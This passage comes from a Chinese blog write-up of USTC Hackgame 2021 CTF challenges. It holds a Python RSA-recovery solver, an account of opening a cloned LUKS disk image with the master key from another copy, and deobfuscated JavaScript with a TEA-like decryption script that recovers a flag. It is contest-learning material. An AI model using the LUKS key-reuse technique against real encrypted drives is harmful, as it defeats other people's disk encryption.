class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Getting p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">x, y, p</span>):</span><br><span class="line">    res = <span class="number">1</span>;  <span class="comment"># Initialize result</span></span><br><span class="line">    x = x % p;  <span class="comment"># Update x if it is more</span></span><br><span class="line">    <span class="comment"># than or equal to p</span></span><br><span class="line">    <span class="keyword">while</span> (y &gt; <span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If y is odd, multiply</span></span><br><span class="line">        <span class="comment"># x with result</span></span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>):</span><br><span class="line">            res = (res * x) % p;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># y must be even now</span></span><br><span class="line">        y = y &gt;&gt; <span class="number">1</span>;  <span class="comment"># y = y/2</span></span><br><span class="line">        x = (x * x) % p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to find modular inverse</span></span><br><span class="line"><span class="comment"># of a under modulo p using Fermat&#x27;s</span></span><br><span class="line"><span class="comment"># method. Assumption: p is prime</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modInverse</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="keyword">return</span> power(a, p - <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Returns n! % p using</span></span><br><span class="line"><span class="comment"># Wilson&#x27;s Theorem</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modFact</span>(<span class="params">n, p</span>):</span><br><span class="line">    <span class="comment"># n! % p is 0 if n &gt;= p</span></span><br><span class="line">    <span class="keyword">if</span> (p &lt;= n):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize result as (p-1)!</span></span><br><span class="line">    <span class="comment"># which is -1 or (p-1)</span></span><br><span class="line">    res = (p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Multiply modulo inverse of</span></span><br><span class="line">    <span class="comment"># all numbers from (n+1) to p</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>, p):</span><br><span class="line">        res = (res * modInverse(i, p)) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>():</span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    p = sympy.nextprime(modFact(y, x))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Getting q</span></span><br><span class="line"><span class="comment"># 要定义这个运算，需要三个整数。a的模逆元素（对n取模）为b，意味着a*b mod m=1，则称a关于m的模逆为b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findModReverse</span>(<span class="params">a, m</span>):  <span class="comment"># 这个扩展欧几里得算法求模逆</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> gcd(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3</span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_q</span>():</span><br><span class="line">    value = [<span class="number">80096058210213458444437404275177554701604739094679033012396452382975889905967</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        value.append(sympy.prevprime(value[i - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Euler&#x27;s totient function</span></span><br><span class="line">    r = <span class="number">1</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r = r * (value[i] - <span class="number">1</span>)</span><br><span class="line">        n = n * value[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Modular multiplicative inverse</span></span><br><span class="line">    d = findModReverse(e, r)</span><br><span class="line"></span><br><span class="line">    cipher_q = <span class="number">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">    q = sympy.nextprime(<span class="built_in">pow</span>(cipher_q, d, n))</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = get_p()</span><br><span class="line">q = get_q()</span><br><span class="line">n = p * q</span><br><span class="line">r = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = findModReverse(e, r)</span><br><span class="line">c = <span class="number">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = m.to_bytes(<span class="number">28</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.decode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="加密的-U-盘"><a href="#加密的-U-盘" class="headerlink" title="加密的 U 盘"></a>加密的 U 盘</h2><p>题目给出两个U盘文件，一个是第一天的，已知密码挂载即可打开。一个是第二天的，说是设置了“随机生成的强密码”。这里打引号是因为我们根本不需要破解所谓的强密码。根据 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup">Linux Unified Key Setup - Wikipedia</a> 给出的外链参考 <a target="_blank" rel="noopener" href="https://gitlab.com/cryptsetup/cryptsetup/-/wikis/FrequentlyAskedQuestions">FrequentlyAskedQuestions · Wiki · cryptsetup &#x2F; cryptsetup · GitLab</a> 写到：</p>
+<blockquote>
+<p>  CLONING&#x2F;IMAGING: If you clone or image a LUKS container, you make a copy of the LUKS header and the master key will stay the same!  That means that if you distribute an image to several machines, the same master key will be used on all of them, regardless of whether you change the passphrases.  Do NOT do this!  If you do, a root-user on any of the machines with a mapped (decrypted) container or a passphrase on that machine can decrypt all other copies, breaking security.  See also Item 6.15.</p>
+</blockquote>
+<p>通过 <a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/119803/how-to-decrypt-luks-with-the-known-master-key">How to decrypt LUKS with the known master key? - Unix &amp; Linux Stack Exchange</a> 的利用方法，导出第一天硬盘镜像的 <code>master-key</code> 文件，再用这个 <code>master-key</code> 去打开第二天的硬盘即可。</p>
+<h2 id="赛博厨房"><a href="#赛博厨房" class="headerlink" title="赛博厨房"></a>赛博厨房</h2><p><strong>Level 0</strong></p>
+<p>Level 0 甚至可以用来做签到题目，只需要基础的编程思想就可以按照指令一步步做出来，毕竟才两个材料。（没有特别多人做出来很可能是因为看到总分600分怕了，以为是一道题）</p>
+<p><strong>Level 1</strong></p>
+<p>有过指令集等相关知识的一看题目便知道这是使用循环，当不满足条件时向上跳转，直到满足条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">向右 1 步</span><br><span class="line">拿起 100 个物品</span><br><span class="line">向左 1 步</span><br><span class="line">向下 1 步</span><br><span class="line">放下 1 个物品</span><br><span class="line">如果手上的物品大于等于 0 向上跳转 1 行</span><br></pre></td></tr></table></figure>
+
+<h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><p>这题其实是披着web的皮，戴着crytpo手套的reverse狼。为什么这么说呢，打开web游戏的源代码，可以看到 JS 中打开所有三盏灯的关键部分是一个叫 <code>gyflagh()</code> 的函数。这个函数在 flag.js 里面，同样使用谷歌浏览器开发工具即可找到并以漂亮的代码格式整理好展示。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(cinput.<span class="property">length</span>&gt;=<span class="number">32</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> tbool=<span class="title function_">gyflagh</span>(cinput.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">	<span class="keyword">if</span>(tbool) &#123;</span><br><span class="line">		pressplateList[<span class="number">65</span>].<span class="title class_">TurnOn</span>_redstone_lamp();</span><br><span class="line">		content.<span class="property">innerText</span>=<span class="string">&#x27;Congratulations!!!&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cinput.<span class="property">length</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是，flag.js 的代码是过了混淆的，根据格式来看很可能是 javascript-obfuscator 混淆后生成的代码，多创建了一个字典函数，所有函数执行都是先通过字典函数还原之后再执行。通过 <a target="_blank" rel="noopener" href="http://jsnice.org/">JS NICE: Statistical renaming, Type inference and Deobfuscation</a> 能够一定程度上缓解混淆。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x381b</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> _0x4af9ee = [<span class="string">&quot;encrypt&quot;</span>, <span class="string">&quot;33MGcQht&quot;</span>, <span class="string">&quot;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&quot;</span>, <span class="string">&quot;14021KbbewD&quot;</span>, <span class="string">&quot;charCodeAt&quot;</span>, <span class="string">&quot;808heYYJt&quot;</span>, <span class="string">&quot;5DlyrGX&quot;</span>, <span class="string">&quot;552oZzIQH&quot;</span>, <span class="string">&quot;fromCharCode&quot;</span>, <span class="string">&quot;356IjESGA&quot;</span>, <span class="string">&quot;784713mdLTBv&quot;</span>, <span class="string">&quot;2529060PvKScd&quot;</span>, <span class="string">&quot;805548mjjthm&quot;</span>, <span class="string">&quot;844848vFCypf&quot;</span>, <span class="string">&quot;4bIkkcJ&quot;</span>, <span class="string">&quot;1356853149054377&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;slice&quot;</span>, <span class="string">&quot;1720848ZSQDkr&quot;</span>];</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> &#123;<span class="type">?</span>&#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  _0x381b = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x4af9ee;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x381b</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x2c9e</span>(<span class="params">_0x49e6ff, _0x310d40</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> _0x381b4c = <span class="title function_">_0x381b</span>();</span><br><span class="line">    <span class="keyword">return</span> _0x2c9e = <span class="keyword">function</span>(<span class="params">_0x2c9ec6, _0x2ec3bd</span>) &#123;</span><br><span class="line">        _0x2c9ec6 = _0x2c9ec6 - <span class="number">0x1a6</span>;</span><br><span class="line">        <span class="keyword">let</span> _0x4769df = _0x381b4c[_0x2c9ec6];</span><br><span class="line">        <span class="keyword">return</span> _0x4769df;</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="title function_">_0x2c9e</span>(_0x49e6ff, _0x310d40);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>细读代码之后可以发现，关键的加密代码是这个，并且通过谷歌浏览器调试也可以发现这个函数名是 encrypt。使用方式为 <code>String&lt;type&gt;.encrypt(seed)</code> 。而encrypted函数中关键的函数就是 <code>code()</code> 这个才是主要的加密功能的函数。反混淆之后的 <code>code()</code> 函数如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">code</span>(<span class="params">p, q</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> time = <span class="number">2654435769</span>;</span><br><span class="line">  <span class="keyword">const</span> constrain = time * <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i != constrain;) &#123;</span><br><span class="line">    p[<span class="number">0</span>] = p[<span class="number">0</span>] + ((p[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">1</span>] ^ i + q[i &amp; <span class="number">3</span>]);</span><br><span class="line">    i = i + time;</span><br><span class="line">    p[<span class="number">1</span>] = p[<span class="number">1</span>] + ((p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">0</span>] ^ i + q[i &gt;&gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  p[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">  p[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个过程很像一个对称式加密，其中密钥的部分是恒定的，可以通过调试手段从混淆函数中找到，因此非常容易反解出来，以此为依据撰写他的解密函数 <code>decode()</code> ，函数如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decode</span>(<span class="params">p, q</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> time = <span class="number">2654435769</span>;</span><br><span class="line">  <span class="keyword">const</span> constrain = time * <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">let</span> i = constrain;</span><br><span class="line">  <span class="keyword">while</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">    p[<span class="number">1</span>] = p[<span class="number">1</span>] - ((p[<span class="number">0</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">0</span>] ^ i + q[i &gt;&gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>]);</span><br><span class="line">    i = i - time;</span><br><span class="line">    p[<span class="number">0</span>] = p[<span class="number">0</span>] - ((p[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> ^ p[<span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + p[<span class="number">1</span>] ^ i + q[i &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  p[<span class="number">0</span>] = p[<span class="number">0</span>];</span><br><span class="line">  p[<span class="number">1</span>] = p[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的，逆向分解加密后的一长串字符串，并逐一解密即可，完整EXP代码如下，此代码可以直接放到浏览器调试窗口运行即可。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&#x27;</span>;</span><br><span class="line">seed = <span class="string">&#x27;1356853149054377&#x27;</span>;</span><br><span class="line">output = <span class="string">&#x27;flag&#123;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    q[i] = <span class="title class_">Str4ToLong</span>(seed.<span class="title function_">slice</span>(i * <span class="number">4</span>, (i + <span class="number">1</span>) * <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cipher.<span class="property">length</span>; i = i + <span class="number">16</span>) &#123;</span><br><span class="line">    p[<span class="number">0</span>] = <span class="title class_">Base16ToLong</span>(cipher.<span class="title function_">slice</span>(i, i + <span class="number">8</span>));</span><br><span class="line">    p[<span class="number">1</span>] = <span class="title class_">Base16ToLong</span>(cipher.<span class="title function_">slice</span>(i + <span class="number">8</span>, i + <span class="number">16</span>));</span><br><span class="line">    <span class="title function_">decode</span>(p, q);</span><br><span class="line">    output = output + <span class="title class_">LongToStr4</span>(p[<span class="number">0</span>]) + <span class="title class_">LongToStr4</span>(p[<span class="number">1</span>]);</span><br><span class="line">    p = [];</span><br><span class="line">&#125;</span><br><span class="line">output = output + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E2%80%94%E2%80%94%E5%8F%82%E4%B8%8A"><span class="toc-number">2.</span> <span class="toc-text">进制十六——参上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2"><span class="toc-number">3.</span> <span class="toc-text">去吧！追寻自由的电波</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94-Pro-Max"><span class="toc-number">4.</span> <span class="toc-text">猫咪问答 Pro Max</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%96%E7%93%9C"><span class="toc-number">5.</span> <span class="toc-text">卖瓜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">透明的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87"><span class="toc-number">7.</span> <span class="toc-text">旅行照片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FLAG-%E5%8A%A9%E5%8A%9B%E5%A4%A7%E7%BA%A2%E5%8C%85"><span class="toc-number">8.</span> <span class="toc-text">FLAG 助力大红包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Amnesia"><span class="toc-number">9.</span> <span class="toc-text">Amnesia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">10.</span> <span class="toc-text">图之上的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-RSA"><span class="toc-number">11.</span> <span class="toc-text">Easy RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84-U-%E7%9B%98"><span class="toc-number">12.</span> <span class="toc-text">加密的 U 盘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E5%8E%A8%E6%88%BF"><span class="toc-number">13.</span> <span class="toc-text">赛博厨房</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#minecRaft"><span class="toc-number">14.</span> <span class="toc-text">minecRaft</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&text=USTC Hackgame 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&is_video=false&description=USTC Hackgame 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=USTC Hackgame 2021&body=Check out this article: https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&title=USTC Hackgame 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&name=USTC Hackgame 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2021/11/04/USTC-Hackgame-2021/&t=USTC Hackgame 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Thomason Zhao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
